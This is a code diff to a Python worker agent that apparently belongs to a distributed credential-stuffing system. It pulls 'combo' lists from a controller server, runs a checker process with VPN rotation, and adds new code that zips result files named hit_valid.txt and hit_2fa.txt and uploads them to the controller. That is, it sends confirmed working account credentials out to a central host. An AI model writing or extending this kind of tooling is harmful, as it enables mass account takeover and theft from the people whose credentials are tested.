@@ -17,6 +17,7 @@ import threading
 import time
 import urllib.parse
 import urllib.request
+import zipfile
 from collections import deque
 
 _SAFE_ID_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")
@@ -229,8 +230,12 @@ class MuseAgent:
             self.active_job = info
             return info
         self.active_job = info
-        self._safe_flush_hits()
-        self.save_active_job(None)
+        try:
+            self.flush_hits_sync()
+            self.upload_finished_output_sync(force=True)
+            self.save_active_job(None)
+        except Exception:
+            pass
         return None
 
     def apply_new_induk(self, new_url: str) -> None:
@@ -338,12 +343,17 @@ class MuseAgent:
         return batches, next_offsets
 
     def _http_request(self, method: str, path_or_url: str, body: dict | None = None, timeout: float = 15.0) -> bytes:
+        data = json.dumps(body).encode("utf-8") if body is not None else None
+        ctype = "application/json" if body is not None else ""
+        return self._http_request_raw(method, path_or_url, data=data, content_type=ctype, timeout=timeout)
+
+    def _http_request_raw(
+        self, method: str, path_or_url: str, data: bytes | None = None, content_type: str = "", timeout: float = 15.0
+    ) -> bytes:
         url = path_or_url if path_or_url.startswith(("http://", "https://")) else f"{self.induk_url}{path_or_url}"
         headers = {"Authorization": f"Bearer {self.token}"}
-        data = None
-        if body is not None:
-            data = json.dumps(body).encode("utf-8")
-            headers["Content-Type"] = "application/json"
+        if content_type:
+            headers["Content-Type"] = content_type
         req = urllib.request.Request(url, data=data, headers=headers, method=method)
         with urllib.request.urlopen(req, timeout=timeout) as resp:
             return resp.read()
@@ -439,7 +449,7 @@ class MuseAgent:
         cmd.extend(args)
         return cmd
 
-    def _start_checker(self, payload: dict) -> str:
+    def _start_checker(self, payload: dict, upload_prev: bool = True) -> str:
         raw_jid = str(payload.get("job_id") or f"job_{int(time.time())}").strip()
         if not _SAFE_ID_RE.match(raw_jid) or ".." in raw_jid:
             raise ValueError(f"Invalid job_id: {raw_jid!r}")
@@ -447,8 +457,15 @@ class MuseAgent:
         combo_url = str(payload.get("combo_url") or f"/api/v1/agent/combo/{job_id}/{self.vps_id}")
         combo_raw = self._http_request("GET", combo_url, timeout=30.0)
         with self._job_lock:
-            if self.active_job and _is_pid_alive(int(self.active_job.get("pid") or 0)):
+            prev_alive = bool(self.active_job and _is_pid_alive(int(self.active_job.get("pid") or 0)))
+            if self.active_job and prev_alive:
                 self._stop_checker_proc()
+            had_prev = bool(self.active_job)
+        if had_prev:
+            self._safe_flush_hits()
+            if upload_prev:
+                self._safe_upload_finished_output(force=True)
+        with self._job_lock:
             job_dir = os.path.join(self.state_dir, "jobs", job_id)
             out_dir = os.path.join(self.work_dir, "output", job_id)
             os.makedirs(job_dir, exist_ok=True)
@@ -490,13 +507,19 @@ class MuseAgent:
             if ctype == "STOP":
                 with self._job_lock:
                     self._stop_checker_proc()
+                self._safe_flush_hits()
+                self._safe_upload_finished_output(force=True)
+                with self._job_lock:
                     self.save_active_job(None)
                 return True, "stopped"
             if ctype == "RESTART":
                 with self._job_lock:
                     prev_payload = (self.active_job or {}).get("payload") or payload
                     self._stop_checker_proc()
-                return True, self._start_checker(prev_payload)
+                    if self.active_job:
+                        self.active_job["output_uploaded"] = False
+                self._safe_flush_hits()
+                return True, self._start_checker(prev_payload, upload_prev=False)
             if ctype == "ROTATE_VPN":
                 with self._job_lock:
                     job = self.active_job
@@ -614,6 +637,7 @@ class MuseAgent:
                     async def _sender() -> None:
                         while not self._reconnect_needed:
                             await asyncio.to_thread(self._safe_flush_hits)
+                            await asyncio.to_thread(self._safe_upload_finished_output)
                             await ws.send(json.dumps(self.build_telemetry()))
                             for _ in range(30):
                                 if self._reconnect_needed:
@@ -657,6 +681,43 @@ class MuseAgent:
     def _safe_flush_hits(self) -> None:
         try:
             self.flush_hits_sync()
+        except Exception:
+            pass
+
+    def upload_finished_output_sync(self, force: bool = False) -> bool:
+        with self._job_lock:
+            proc_alive = False
+            if self.proc is not None:
+                proc_alive = self.proc.poll() is None
+            job = dict(self.active_job) if self.active_job else None
+        if not job or job.get("output_uploaded"):
+            return False
+        pid = int(job.get("pid") or 0)
+        if not force and (proc_alive or (self.proc is None and pid and _is_pid_alive(pid))):
+            return False
+        out_dir = job.get("output_dir") or ""
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+            for fname in ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt"):
+                fp = os.path.join(out_dir, fname)
+                if os.path.isfile(fp) and os.path.getsize(fp) > 0:
+                    zf.write(fp, arcname=fname)
+        self._http_request_raw(
+            "POST",
+            f"/api/v1/agent/output/{job['job_id']}",
+            data=buf.getvalue(),
+            content_type="application/zip",
+            timeout=30.0,
+        )
+        with self._job_lock:
+            if self.active_job and self.active_job.get("job_id") == job.get("job_id"):
+                self.active_job["output_uploaded"] = True
+                self.save_active_job(self.active_job)
+        return True
+
+    def _safe_upload_finished_output(self, force: bool = False) -> None:
+        try:
+            self.upload_finished_output_sync(force=force)
         except Exception:
             pass
 
